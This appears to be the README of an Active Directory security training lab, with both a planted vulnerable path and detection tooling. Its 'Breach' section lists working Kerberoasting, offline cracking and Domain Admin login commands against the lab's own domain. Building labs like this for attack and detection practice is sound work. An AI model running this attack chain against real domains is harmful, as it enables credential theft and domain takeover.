Toolchain

VMware + Vagrant

Vagrant defines and boots the four VMs on the VMware provider. Boxes are pulled automatically — no manual image downloads.

Ansible

Turns the empty VMs into a real domain over WinRM: promote the DC, join members, create users, apply the password policy, deploy monitoring.

Docker

Runs BloodHound CE (web app + Postgres + Neo4j) and a NetExec-based collector container that maps the domain's attack paths.

What the Lab Does

Domain simulation

core

A working AD forest with OUs, security groups, and realistic users — logins derived automatically from each person's name.

Detection (blue)

Sysmon + honeypots

Sysmon on every host plus honeypot decoy accounts with a SACL tripwire. Kerberoast, spray, and recon all raise events that honey_detect.yml hunts.

Attack surface (red)

opt-in vuln

vulns.yml plants a deliberately breakable path to Domain Admin. Toggle it on for exploit practice, off to return to a clean lab.

Attack-path mapping

BloodHound CE

Dockerized BloodHound with a container collector. LDAPS is auto-enabled on the DC so collection works against the signing-enforced Server 2025.

The Breach  (opt-in, after ansible-playbook vulns.yml)

STEP 01

Kerberoast

Request the TGS for svc_sql with any domain credential. The account is RC4-downgraded, so the hash cracks on CPU.

impacket-GetUserSPNs lab.local/vagrant:vagrant -dc-ip 192.168.100.10 -request-user svc_sql
STEP 02

Crack offline

The password lives in rockyou.txt, so John recovers Password1 in under a second — no GPU needed.

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
STEP 03

Domain Admin

svc_sql is in Domain Admins — the cracked password is full domain compromise (verified via DCSync of krbtgt).

nxc smb 192.168.100.10 -u svc_sql -p Password1

This path is deliberately loud — the Kerberoast trips a 4769 the honeypot sensor catches, so it doubles as an exercise for the detection side.

Command Reference

Bring the whole lab up

# one-liner: VMs + domain + monitoring + LDAPS
./vagrant-project/bootstrap.sh

# flags
./bootstrap.sh --no-kali
./bootstrap.sh --no-monitoring
./bootstrap.sh --ansible # playbooks only

Vagrant · ./vagrant-project/

vagrant up # all machines
vagrant status
vagrant halt # stop cleanly
vagrant reload kali1
vagrant ssh kali1

Ansible · ./ansible/

ansible-playbook ping.yml # test WinRM
ansible-playbook site.yml # build domain
ansible-playbook sysmon.yml
ansible-playbook honeypots.yml
ansible-playbook honey_detect.yml # hunt
ansible-playbook enable_ldaps.yml

Vuln toggle + BloodHound

# make it breakable / clean up
ansible-playbook vulns.yml
ansible-playbook vulns.yml -e vuln_state=absent

docker compose up -d
